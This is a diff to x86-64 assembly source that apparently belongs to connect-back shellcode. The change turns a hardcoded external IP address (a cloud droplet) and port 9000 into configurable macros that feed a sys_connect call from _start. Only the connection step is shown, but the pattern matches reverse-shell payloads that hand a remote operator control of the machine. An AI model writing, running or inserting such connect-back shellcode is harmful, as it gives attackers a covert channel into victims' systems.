@@ -1,5 +1,12 @@
 [bits 64]
 
+%ifndef IPADDR
+    %define IPADDR 0xB7_D0_D1_86 ; 134.209.208.183 (digital ocean droplet)
+%endif
+%ifndef PORT
+    %define PORT 0x2823 ; 9000
+%endif
+
 global _start
 
 _start: 
@@ -20,8 +27,8 @@ _start:
     mov rax, 42 ; sys_connect
     sub rsp, 16
     mov word [rsp], 2
-    mov word [rsp+2], 0x2823 ; port 9000 
-    mov dword [rsp+4], 0xB7_D0_D1_86 ; digital ocean droplet ip
+    mov word [rsp+2], PORT
+    mov dword [rsp+4], IPADDR
     mov rsi, rsp
     mov rdx, 16
     syscall
